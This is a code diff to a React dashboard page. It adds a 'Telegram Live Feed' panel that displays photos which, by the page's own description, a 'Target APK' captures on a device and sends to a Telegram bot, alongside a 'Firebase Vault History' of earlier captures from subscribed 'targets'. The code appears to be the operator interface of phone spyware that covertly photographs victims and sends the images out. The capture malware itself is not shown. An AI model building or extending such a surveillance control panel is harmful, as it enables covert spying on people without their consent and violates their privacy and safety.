@@ -5,8 +5,69 @@ import { Camera, ChevronDown, X, Image as ImageIcon, Download, RefreshCcw } from
 import { clsx } from 'clsx';
 import { twMerge } from 'tailwind-merge';
 import { useImageCaptures } from '@/hooks/useFirebase';
+import { useTelegramPhoto } from '@/hooks/useTelegram';
 import { subscribeToTargets } from '@/services/targetService';
 import { Target } from '@/types/target';
+
+function TelegramLivePreview() {
+  const { photo, timestamp, isLoading, error, refresh } = useTelegramPhoto();
+
+  if (isLoading && !photo) {
+    return (
+      <div className="aspect-square rounded-2xl bg-white/5 animate-pulse border border-white/10 flex items-center justify-center">
+        <RefreshCcw size={24} className="text-cyan-500/50 animate-spin" />
+      </div>
+    );
+  }
+
+  if (error) {
+    return (
+      <div className="aspect-square rounded-2xl bg-red-500/5 border border-red-500/20 flex flex-col items-center justify-center p-4 text-center">
+        <X size={24} className="text-red-500 mb-2" />
+        <p className="text-[10px] text-red-400 font-mono">{error}</p>
+        <button 
+          onClick={refresh}
+          className="mt-3 text-[10px] bg-red-500/20 text-red-400 px-3 py-1 rounded-lg hover:bg-red-500/30 transition-colors"
+        >
+          RETRY
+        </button>
+      </div>
+    );
+  }
+
+  return (
+    <div className="relative group aspect-square rounded-2xl overflow-hidden border border-cyan-500/30 bg-black/40 shadow-lg shadow-cyan-500/10">
+      {photo ? (
+        <>
+          <img src={photo} alt="Telegram Live" className="w-full h-full object-cover transition-transform group-hover:scale-105" />
+          <div className="absolute inset-x-0 bottom-0 p-3 bg-gradient-to-t from-black/80 via-black/40 to-transparent">
+            <p className="text-[10px] text-cyan-400 font-mono font-bold">LATEST TELEGRAM CAPTURE</p>
+            <p className="text-[9px] text-white/60 font-mono mt-0.5">
+              {timestamp ? new Date(timestamp).toLocaleString() : 'Just now'}
+            </p>
+          </div>
+          <button 
+            onClick={refresh}
+            className="absolute top-2 right-2 w-8 h-8 rounded-lg bg-black/60 border border-white/10 flex items-center justify-center text-white opacity-0 group-hover:opacity-100 transition-opacity hover:bg-cyan-500/20 hover:border-cyan-500/50"
+          >
+            <RefreshCcw size={14} />
+          </button>
+        </>
+      ) : (
+        <div className="flex flex-col items-center justify-center h-full p-6 text-center">
+          <ImageIcon size={32} className="text-slate-700 mb-2" />
+          <p className="text-[10px] text-slate-500 font-mono">No Telegram photo found. Send a photo to the bot from APK.</p>
+          <button 
+            onClick={refresh}
+            className="mt-4 text-[10px] border border-white/10 text-slate-400 px-4 py-1.5 rounded-lg hover:bg-white/5 transition-colors"
+          >
+            CHECK AGAIN
+          </button>
+        </div>
+      )}
+    </div>
+  );
+}
 
 const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));
 
@@ -152,8 +213,52 @@ export default function CameraPage() {
             </button>
           </div>
 
+          {/* Telegram Live Feed Section */}
+          <div className="mb-8 rounded-2xl border border-cyan-500/20 bg-cyan-500/[0.03] p-6 backdrop-blur-md">
+            <div className="flex items-center justify-between mb-4">
+              <div className="flex items-center gap-2">
+                <div className="w-2 h-2 bg-cyan-400 rounded-full animate-pulse" />
+                <h2 className="text-sm font-bold uppercase tracking-wider text-cyan-400">Telegram Live Feed</h2>
+              </div>
+              <p className="text-[10px] text-slate-500 font-mono italic">Source: APK -> Telegram Bot</p>
+            </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 items-start">
+              {/* Latest Photo Card */}
+              <div className="md:col-span-1">
+                <TelegramLivePreview />
+              </div>
+
+              {/* Info & Instructions */}
+              <div className="md:col-span-2 space-y-4">
+                <div className="rounded-xl border border-white/5 bg-white/5 p-4">
+                  <h3 className="text-xs font-bold text-white uppercase mb-2">How it works</h3>
+                  <ul className="text-[11px] text-slate-400 space-y-2 list-disc pl-4">
+                    <li>Target APK captures photo and sends to Telegram Bot.</li>
+                    <li>This dashboard polls the Bot API every 30s for the latest image.</li>
+                    <li>Image is retrieved directly from Telegram servers (Encrypted).</li>
+                  </ul>
+                </div>
+                
+                <div className="flex gap-3">
+                  <div className="flex-1 rounded-xl border border-white/5 bg-white/5 p-3">
+                    <p className="text-[10px] text-slate-500 uppercase">Bot Status</p>
+                    <p className="text-xs font-bold text-emerald-400">CONNECTED</p>
+                  </div>
+                  <div className="flex-1 rounded-xl border border-white/5 bg-white/5 p-3">
+                    <p className="text-[10px] text-slate-500 uppercase">Last Sync</p>
+                    <p className="text-xs font-bold text-cyan-400">Real-time</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
           {/* Photo Gallery Grid */}
           <div className="border-t border-white/10 pt-6">
+            <div className="flex items-center justify-between mb-6">
+               <h2 className="text-sm font-bold uppercase tracking-wider text-slate-400">Firebase Vault History</h2>
+            </div>
             {isLoading ? (
               <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                 {[...Array(8)].map((_, i) => (
